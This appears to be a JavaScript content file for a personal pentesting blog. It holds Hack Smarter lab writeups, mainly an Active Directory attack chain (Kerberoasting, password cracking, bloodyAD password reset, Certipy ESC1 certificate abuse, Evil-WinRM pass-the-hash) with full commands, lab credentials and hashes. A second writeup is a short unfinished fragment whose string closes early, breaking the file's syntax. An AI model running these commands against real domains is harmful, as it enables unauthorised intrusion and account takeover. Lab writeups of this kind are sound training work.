/* ===================================================================
   DORAEMON BLOG — CONTENT FILE
   This is the ONLY file you edit to add, change or remove content.
   After editing, commit and push to GitHub — that's your "publish".
   =================================================================== */

const ABOUT = {
  name: "Doraemon",
  bio: "I dig through my pocket for the right tool to break into Active Directory, Web, Linux, Windows and Cloud labs on Hack Smarter. Every box gets a writeup covering the exploit, the dead ends and the flag. Offensive certifications: PJPT.",
  links: [["Hack Smarter", "https://www.hacksmarter.org/learners/e18d9662-7163-458a-89c7-d62d9e8ca76d"]]
};

// Categories shown as filter chips on the Writeups page.
const CATS = ["Active Directory", "Web", "Windows", "Linux", "Cloud", "OSCP-LK", "Ranges"];
const DIFFS = ["Easy", "Medium", "Hard", "Insane"];

/* ---------- WRITEUPS ----------
   id: unique, used in the URL (#your-id). Letters, numbers, dashes only.
   body: Markdown. Supports # ## ### headings, - lists, **bold**,
         `inline code`, ```code blocks``` and ![alt](assets/path.png) images.
   files: optional downloadable attachments, e.g.
          [{name:"exploit.py", url:"assets/writeups/arasaka/exploit.py"}]
*/
const WRITEUPS = [
  {
    id: "arasaka-hsm",
    title: "Arasaka (Hack Smarter Labs)",
    ctf: "Hack Smarter Labs",
    cat: "Active Directory",
    diff: "Easy",
    pts: 0,
    date: "2026-04-17",
    summary: "An assumed-breach Active Directory pentest on Hack Smarter Labs, starting from a standard domain user.",
    files: [],
    body: `![Arasaka preview](assets/writeups/arasaka/preview.png)

## Objective / Scope

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, faraday.

## Assumed breach credentials

\`\`\`
faraday:hacksmarter123
\`\`\`

## Reconnaissance

### Nmap scan

\`\`\`
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-04-25 14:33:10Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
| rdp-ntlm-info:
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-25T14:34:01+00:00
5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
\`\`\`

### Key findings

- The target is a domain controller: **DC01.hacksmarter.local** (domain \`hacksmarter.local\`, NetBIOS \`HACKSMARTER\`).
- Kerberos (88), LDAP/LDAPS (389, 636, 3268, 3269), SMB (445) and DNS (53) are exposed, which is the expected Active Directory attack surface.
- SMB signing is enabled and required, so SMB relay attacks are not an option.
- WinRM (5985) is open, which allows a remote shell once valid credentials are available.

## NetExec User Enumeration

Using the assumed breach credentials, I enumerated the domain users over SMB with NetExec.

\`\`\`
nxc smb 10.1.171.27 -u faraday -p hacksmarter123 --users
\`\`\`

\`\`\`
SMB  10.1.171.27  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.1.171.27  445  DC01  [+] hacksmarter.local\\faraday:hacksmarter123
SMB  10.1.171.27  445  DC01  -Username-        -Last PW Set-        -BadPW- -Description-
SMB  10.1.171.27  445  DC01  Administrator     2025-09-18 22:40:20  0       Built-in account for administering the computer/domain
SMB  10.1.171.27  445  DC01  Guest             <never>              0       Built-in account for guest access to the computer/domain
SMB  10.1.171.27  445  DC01  krbtgt            2025-09-21 02:51:44  0       Key Distribution Center Service Account
SMB  10.1.171.27  445  DC01  Goro              2025-09-21 15:00:31  0       Loyal to a fault
SMB  10.1.171.27  445  DC01  alt.svc           2025-09-21 15:07:42  0       Trapped for eternity
SMB  10.1.171.27  445  DC01  Yorinobu          2026-04-17 13:30:41  0
SMB  10.1.171.27  445  DC01  Hanako            2025-09-21 14:59:03  0       Waiting at embers
SMB  10.1.171.27  445  DC01  Faraday           2025-09-21 15:06:45  0
SMB  10.1.171.27  445  DC01  Smasher           2025-09-21 15:01:20  0
SMB  10.1.171.27  445  DC01  Soulkiller.svc    2025-09-21 15:30:13  0       Certificate managment for soulkiller AI
SMB  10.1.171.27  445  DC01  Hellman           2025-09-21 15:04:19  0
SMB  10.1.171.27  445  DC01  kei.svc           2025-09-21 15:05:16  0       Trapped for eternity
SMB  10.1.171.27  445  DC01  Silverhand.svc    2025-09-21 15:03:10  0       Trapped for eternity
SMB  10.1.171.27  445  DC01  Oda               2025-09-21 15:02:14  0
SMB  10.1.171.27  445  DC01  the_emperor       2025-11-06 17:19:03  0
SMB  10.1.171.27  445  DC01  [*] Enumerated 15 local users: HACKSMARTER
\`\`\`

### Key findings

- The \`faraday\` credentials are valid (\`[+]\`), and NetExec confirms the host is **Windows Server 2022 Build 20348** with SMB signing enabled.
- 15 domain users were returned, and all show 0 bad password attempts.
- Four accounts follow a \`.svc\` naming convention: \`alt.svc\`, \`Soulkiller.svc\`, \`kei.svc\` and \`Silverhand.svc\`. The description for \`Soulkiller.svc\` mentions certificate management.

## Kerberostable user

Next I queried the domain for accounts with a Service Principal Name (SPN) set, since those can be Kerberoasted. I used Impacket's \`GetUserSPNs.py\` with the \`faraday\` credentials.

\`\`\`
./GetUserSPNs.py hacksmarter.local/faraday:'hacksmarter123' -dc-ip 10.1.171.27
\`\`\`

\`\`\`
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon                   Delegation
------------------------------  -------  --------  --------------------------  --------------------------  ----------
AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 15:07:42.894050  2026-04-17 13:47:56.116856
\`\`\`

### Key findings

- One Kerberoastable account was found: **alt.svc**, with the SPN \`AI/blackwall.hacksmarter.local\`.
- The account is not a member of any groups, has no delegation configured, and last logged on 2026-04-17.
- Its password was last set on 2025-09-21, so the password is the part that can be attacked offline.

## john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

With the Kerberoastable hash for \`alt.svc\` captured, I cracked it offline with John the Ripper against the rockyou wordlist.

\`\`\`
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

### Result

\`\`\`
alt.svc : babygirl1
\`\`\`

### Key findings

- The hash cracked quickly, which means \`alt.svc\`'s password, \`babygirl1\`, is a weak, dictionary-based password.
- This gives a foothold as \`alt.svc\` for further enumeration and privilege escalation.

## BloodHound Analysis

With credentials for \`alt.svc\`, I collected data with BloodHound to map out the attack path from here.

![BloodHound graph: alt.svc GenericAll on Yorinobu, Soulkiller.svc GenericWrite on Yorinobu](assets/writeups/arasaka/bloodhound-1.png)

### Key findings

- \`alt.svc\` has a **GenericAll** edge on \`Yorinobu@hacksmarter...\`, meaning \`alt.svc\` has full control over that user object (including resetting its password).
- \`Soulkiller.svc\` has a **GenericWrite** edge on the same \`Yorinobu\` account.
- \`Yorinobu\` is therefore the next pivot: owning \`alt.svc\` is enough to take over \`Yorinobu\` directly via GenericAll.

## Lateral Movement

Using the GenericAll permission \`alt.svc\` holds over \`Yorinobu\`, I abused it with bloodyAD to reset \`Yorinobu\`'s password directly.

\`\`\`
bloodyAD --host "10.1.171.27" -d "hacksmarter.local" -u "alt.svc" -p "babygirl1" set password 'YORINOBU' 'ghost_sec009'
\`\`\`

\`\`\`
[+] Password changed successfully!
\`\`\`

### Key findings

- The GenericAll edge from BloodHound was confirmed in practice: \`alt.svc\` could reset \`Yorinobu\`'s password without knowing the original one.
- \`Yorinobu\`'s credentials are now \`Yorinobu : ghost_sec009\`, giving a foothold as that user for the next step.

## Targeted Kerberoasting

With \`Yorinobu\`'s credentials, I ran a targeted Kerberoast against the domain to look for further roastable accounts.

\`\`\`
python3 targetedKerberoast.py --dc-host DC01.hacksmarter.local -d hacksmarter.local -u yorinobu -p 'ghost_sec009' -f john
\`\`\`

\`\`\`
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Soulkiller.svc)
Soulkiller.svc:$krb5tgs$23$*Soulkiller.svc$HACKSMARTER.LOCAL$hacksmarter.local/Soulkiller.svc*$e17fe21752980589707c598f9d7e4d1c$92a3cb0bc1696e82cf88130d77d32e1bc8464e535811411c474478275584114d26219999636c9b5be4b4af5ca72c57bda1a7c8912f80d692c40e9e9ce1e23a425c564113a508534baca277825eecab82bb139fa9a707967437a4e664bcdc26----<SNIP>-----
\`\`\`

### Key findings

- A TGS hash was recovered for **Soulkiller.svc**, the service account whose description mentioned certificate management back in the User Enumeration step.
- The hash is Kerberos 5 TGS-REP etype 23 (RC4), crackable offline the same way as the earlier \`alt.svc\` hash.

## Password cracking for Soulkiller.svc

\`\`\`
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

### Result

\`\`\`
MYpassword123#   (Soulkiller.svc)
\`\`\`

### Key findings

- The \`Soulkiller.svc\` hash cracked against rockyou, giving credentials \`Soulkiller.svc : MYpassword123#\`.
- Recall from the BloodHound Analysis step that \`Soulkiller.svc\` holds a **GenericWrite** edge on \`Yorinobu\`, and from the Targeted Kerberoasting intro that its description mentions certificate management — worth checking for ADCS abuse next.

## ADCS enumeration

With \`Soulkiller.svc\`'s credentials, I checked BloodHound for Active Directory Certificate Services (ADCS) abuse paths.

![BloodHound graph: Soulkiller.svc has Enroll rights on the AI_TAKEOVER certificate template](assets/writeups/arasaka/adcs-enum.png)

### Key findings

- \`Soulkiller.svc\` has an **Enroll** edge on the certificate template \`AI_TAKEOVER@HACKSMAR...\`, meaning it can request a certificate from this template.
- A certificate template reachable from a low-privileged, already-compromised account is a strong signal of an ESC-style ADCS misconfiguration, worth enumerating further before requesting a certificate.

## Certipy ADCS Enumeration

I used Certipy to enumerate the CA and certificate templates in detail as \`Soulkiller.svc\`.

\`\`\`
certipy-ad find -u 'SOULKILLER.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.171.27 -stdout
\`\`\`

\`\`\`
Certificate Templates
  0
    Template Name                       : AI_Takeover
    Display Name                        : AI_Takeover
    Certificate Authorities             : hacksmarter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKSMARTER.LOCAL\\Soulkiller.svc
                                          HACKSMARTER.LOCAL\\Domain Admins
                                          HACKSMARTER.LOCAL\\Enterprise Admins
    [+] User Enrollable Principals       : HACKSMARTER.LOCAL\\Soulkiller.svc
    [!] Vulnerabilities
      ESC1                               : Enrollee supplies subject and template allows client authentication.
\`\`\`

### Key findings

- The \`AI_Takeover\` certificate template is vulnerable to **ESC1**: it lets the enrollee supply their own subject name (\`EnrolleeSuppliesSubject\`) and allows client authentication.
- \`Soulkiller.svc\` is explicitly listed in the template's Enrollment Rights, matching the Enroll edge seen in BloodHound.
- This combination means \`Soulkiller.svc\` can request a certificate for the \`AI_Takeover\` template while specifying an arbitrary subject — such as a Domain Admin's UPN — and use the resulting certificate to authenticate as that principal.

## ESC1 Exploitation

With the ESC1 misconfiguration confirmed, I requested a certificate as \`Soulkiller.svc\` while setting the UPN to \`THE_EMPEROR\`, a high-value account found during user enumeration.

\`\`\`
certipy-ad req -u 'SOULKILLER.svc@hacksmarter.local' -p "MYpassword123#" -dc-ip "10.1.171.27" -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'THE_EMPEROR' -target 'DC01.hacksmarter.local' -key-size 4096
\`\`\`

\`\`\`
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'THE_EMPEROR'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'the_emperor.pfx'
[*] Wrote certificate and private key to 'the_emperor.pfx'
\`\`\`

### Key findings

- The ESC1 abuse worked: a certificate was issued for the \`THE_EMPEROR\` UPN while authenticating as \`Soulkiller.svc\`, and saved as \`the_emperor.pfx\`.
- Certipy's warning that the certificate "has no object SID" means the cert maps only by UPN, so the next step is to authenticate with this certificate (via PKINIT/Kerberos) to obtain a TGT and NTLM hash as \`the_emperor\`.

\`\`\`
export KRB5CCNAME=THE_EMPEROR@10.1.171.27.ccache
klist
Ticket cache: FILE:THE_EMPEROR@10.1.171.27.ccache
Default principal: THE_EMPEROR@HACKSMARTER.LOCAL

Valid starting     Expires            Service principal
17/04/26 14:18:09  18/04/26 00:18:09  krbtgt/HACKSMARTER.LOCAL@HACKSMARTER.LOCAL
        renew until 18/04/26 14:18:09
\`\`\`

**THE_EMPEROR compromised.**

\`\`\`
evil-winrm -u THE_EMPEROR -H 'd87640b0d83dc7f90f5f30bd6789b133' -i 10.1.171.27

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\\Users\\the_emperor\\Documents>
\`\`\`

![Evil-WinRM shell as the_emperor](assets/writeups/arasaka/evil-winrm.png)
`
  },

  { 
  id: "Dismay-hsm",
  title: "Dismay (Hack Smarter Labs)",
  ctf: "Hack Smarter labs",
  cat: "Active Directory",
  diff: "Hard",
  pts: 0,
  date: "2026-04-27",
  summary: "An assumed-breach Active Directory pentest on Hack Smarter Labs.",

  body: `![Dismay preview](assets/writeups/Dismay/dismay.png)
## Scope/Objective

You have been assigned a penetration test of a client’s internal network. There are three different servers in-scope. Your task is to identify all vulnerabilities and demonstrate impact to the client by elevating your access to Domain Admin. The client has provided you VPN access and Active Directory credentials (below) for the engagement.

## Initial creds

\`\`\`text
Username: xiao.ge
Password: AmBZATVjnH4qo8H4
\`\`\`

## Enumerating Nexus

Target IP: \`10.1.107.228\`

## NMAP

\`\`\`text
80/tcp   open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server

135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn

445/tcp  open  microsoft-ds? syn-ack ttl 126

3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services

| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-GQCP864
|   NetBIOS_Domain_Name: EC2AMAZ-GQCP864
|   NetBIOS_Computer_Name: EC2AMAZ-GQCP864
|   DNS_Domain_Name: EC2AMAZ-GQCP864
|   DNS_Computer_Name: EC2AMAZ-GQCP864
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-27T05:58:11+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-GQCP864
| Issuer: commonName=EC2AMAZ-GQCP864

|_ssl-date: 2026-04-27T05:58:51+00:00; 0s from scanner time.
5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Uptime guess: 0.007 days (since Mon Apr 27 05:49:05 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_  Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32054/tcp): CLEAN (Timeout)
|   Check 2 (port 39521/tcp): CLEAN (Timeout)
|   Check 3 (port 51370/udp): CLEAN (Timeout)
|   Check 4 (port 17234/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-04-27T05:58:14
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   116.24 ms 10.200.0.1
2   ...
3   117.83 ms 10.1.107.228
\`\`\`

### **NetExec SMB Enumeration**

\`\`\`text
# nxc smb 10.1.107.228 -u xiao.ge -p 'AmBZATVjnH4qo8H4' --shares
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (signing:False) (SMBv1:None)
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\\xiao.ge:AmBZATVjnH4qo8H4 
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  [*] Enumerated shares
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  Share           Permissions     Remark
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  -----           -----------     ------
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  ADMIN$                          Remote Admin
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  C$                              Default share
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  IPC$            READ            Remote IPC
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  UpdateServicesPackages READ    A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.1.107.228    445    EC2AMAZ-GQCP864  WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
\`\`\`
`
## XFreeRDP to Get an RDP Shell for `xiao.ge`

![XFreeRDP RDP session for xiao.ge](<assets/writeups/Dismay/RDP(Xiaoge).png>)
  }
];

/* ---------- CERTIFICATIONS ---------- */
const CERTS = [
  {
    id: "c-pjpt",
    name: "PJPT",
    issuer: "TCM Security",
    date: "2026-11",
    credId: "",
    link: "", // verify link removed to avoid exposing the real name on the public Accredible page
    note: "Active Directory hacking, enumeration, ethical hacking, information gathering, pentesting",
    badgeUrl: "assets/certs/pjpt-badge.png",
    fileUrl: "https://certified.tcm-sec.com/d20f0124-d39f-4b72-8449-42e386c89f44#acc.ET8cqlbS", // e.g. "assets/certs/pjpt.jpg" once you add the certificate image/PDF
    fileType: ""  // e.g. "image/jpeg" or "application/pdf"
  }
];
